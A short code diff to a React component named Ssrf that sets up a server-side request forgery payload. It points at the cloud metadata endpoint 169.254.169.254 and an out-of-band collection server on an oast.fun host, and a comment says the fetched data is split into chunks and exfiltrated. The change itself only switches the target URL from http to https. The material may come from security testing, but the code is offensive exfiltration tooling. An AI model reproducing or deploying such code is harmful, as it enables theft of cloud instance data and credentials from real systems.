@@ -4,7 +4,7 @@ function Ssrf() {
   useEffect(() => {
     // Your controlled OOB server and target URL (modify as needed)
     const oobServer = "https://bjgibppjensgmxvguqwdtvjuqsby346yh.oast.fun";
-    const targetUrl = "http://169.254.169.254/latest/meta-data/hostname";
+    const targetUrl = "https://169.254.169.254/latest/meta-data/hostname";
     const timeoutDuration = 5000; // 5 seconds timeout
 
     // Function to split the data into chunks and exfiltrate each chunk
